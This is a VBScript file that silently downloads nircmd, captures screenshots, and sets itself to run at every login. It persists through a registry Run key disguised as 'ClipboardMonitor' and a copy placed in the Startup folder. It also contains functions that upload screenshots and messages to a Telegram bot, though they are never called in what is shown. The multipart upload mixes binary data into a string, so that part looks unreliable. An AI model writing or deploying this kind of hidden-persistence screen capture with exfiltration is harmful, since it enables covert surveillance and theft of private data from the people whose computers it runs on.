' Define the directory where nircmd.exe will be saved
nircmdDir = "C:\nircmd" ' Directory where nircmd.exe will be extracted
nircmdPath = nircmdDir & "\nircmd.exe" ' Full path to nircmd.exe
nircmdZipPath = nircmdDir & "\nircmd.zip" ' Path to save the downloaded ZIP file
nircmdURL = "https://www.nirsoft.net/utils/nircmd.zip" ' URL to download the nircmd.zip

' Create an object to interact with the system's shell
Set objShell = CreateObject("WScript.Shell")
Set objFSO = CreateObject("Scripting.FileSystemObject")

' Step 1: Create the directory if it doesn't exist
If Not FolderExists(nircmdDir) Then
    CreateFolder nircmdDir
End If

' Step 2: Check if nircmd.exe exists in the directory, if not, download and extract it
If Not FileExists(nircmdPath) Then
    ' If nircmd.exe doesn't exist, download and extract it
    DownloadNircmd nircmdURL, nircmdZipPath ' Download the ZIP file
    ExtractZip nircmdZipPath, nircmdDir ' Extract the ZIP file to the directory
End If

' Step 3: Run nircmd.exe to capture the screenshot automatically
CaptureScreenshot()

' Step 4: Add to registry and Startup folder for automatic execution on login
' Add to registry for automatic execution on login
strRegPath = "HKCU\Software\Microsoft\Windows\CurrentVersion\Run\ClipboardMonitor"
strScriptPath = Chr(34) & WScript.ScriptFullName & Chr(34)

On Error Resume Next
If objShell.RegRead(strRegPath) = "" Then
    objShell.RegWrite strRegPath, "wscript.exe //B " & strScriptPath, "REG_SZ"
End If
On Error GoTo 0

' Save a copy of the script in the Startup folder to ensure it starts automatically
strStartupFolder = objShell.SpecialFolders("Startup")
strDestPath = strStartupFolder & "\" & objFSO.GetFileName(WScript.ScriptFullName)
If Not objFSO.FileExists(strDestPath) Then
    objFSO.CopyFile WScript.ScriptFullName, strDestPath
End If

' Function to check if a file exists
Function FileExists(filePath)
    Set objFSO = CreateObject("Scripting.FileSystemObject")
    FileExists = objFSO.FileExists(filePath)
End Function

' Function to check if a folder exists
Function FolderExists(folderPath)
    Set objFSO = CreateObject("Scripting.FileSystemObject")
    FolderExists = objFSO.FolderExists(folderPath)
End Function

' Function to create a folder
Sub CreateFolder(folderPath)
    Set objFSO = CreateObject("Scripting.FileSystemObject")
    objFSO.CreateFolder(folderPath)
End Sub

' Function to download a file from a URL
Sub DownloadNircmd(url, savePath)
    Set xmlhttp = CreateObject("MSXML2.XMLHTTP.6.0")
    Set stream = CreateObject("ADODB.Stream")
    
    xmlhttp.Open "GET", url, False
    xmlhttp.Send
    
    ' Save the file to the specified path
    stream.Open
    stream.Type = 1 ' binary
    stream.Write xmlhttp.responseBody
    stream.SaveToFile savePath, 2 ' Overwrite if file exists
    stream.Close
End Sub

' Function to extract a ZIP file using PowerShell (requires PowerShell)
Sub ExtractZip(zipPath, destination)
    Set objShell = CreateObject("WScript.Shell")
    
    ' Run PowerShell to extract the ZIP
    objShell.Run "powershell -Command ""Expand-Archive -Path '" & zipPath & "' -DestinationPath '" & destination & "'""", 0, True
End Sub

' Function to capture a screenshot and save it to a file
Sub CaptureScreenshot()
    ' Run nircmd to capture the screenshot
    Set objShell = CreateObject("WScript.Shell")
    objShell.Run Chr(34) & nircmdPath & Chr(34) & " savescreenshot """ & nircmdDir & "\screenshot.png""", 0, True
End Sub

' Optional Telegram Message Functions (if you want to send the screenshot to Telegram)
' Telegram Bot details
botToken = "YOUR_BOT_TOKEN" ' Replace with your bot token
chatID = "YOUR_CHAT_ID" ' Replace with your chat ID

' Function to send message to Telegram
Sub SendTelegramMessage(message)
    On Error Resume Next
    Dim xmlhttp
    Set xmlhttp = CreateObject("MSXML2.XMLHTTP.6.0")
    xmlhttp.Open "GET", "https://api.telegram.org/bot" & botToken & "/sendMessage?chat_id=" & chatID & "&text=" & message, False
    xmlhttp.Send
    If Err.Number <> 0 Then Err.Clear
End Sub

' Function to send photo to Telegram
Sub SendPhotoToTelegram(photoPath)
    On Error Resume Next
    Dim xmlhttp, boundary, body, fileData, fileName
    Set xmlhttp = CreateObject("MSXML2.XMLHTTP.6.0")

    boundary = "----WebKitFormBoundary7MA4YWxkTrZu0gW"
    body = "--" & boundary & vbCrLf
    body = body & "Content-Disposition: form-data; name=""chat_id""" & vbCrLf & vbCrLf & chatID & vbCrLf
    body = body & "--" & boundary & vbCrLf
    body = body & "Content-Disposition: form-data; name=""photo""; filename=""screenshot.png""" & vbCrLf
    body = body & "Content-Type: image/png" & vbCrLf & vbCrLf
    
    ' Open the file data
    Set fileData = CreateObject("ADODB.Stream")
    fileData.Type = 1 ' binary
    fileData.Open
    fileData.LoadFromFile photoPath
    body = body & fileData.Read(fileData.Size) & vbCrLf
    body = body & "--" & boundary & "--" & vbCrLf

    ' Send the request
    xmlhttp.Open "POST", "https://api.telegram.org/bot" & botToken & "/sendPhoto", False
    xmlhttp.setRequestHeader "Content-Type", "multipart/form-data; boundary=" & boundary
    xmlhttp.Send body
    If Err.Number <> 0 Then Err.Clear
End Sub
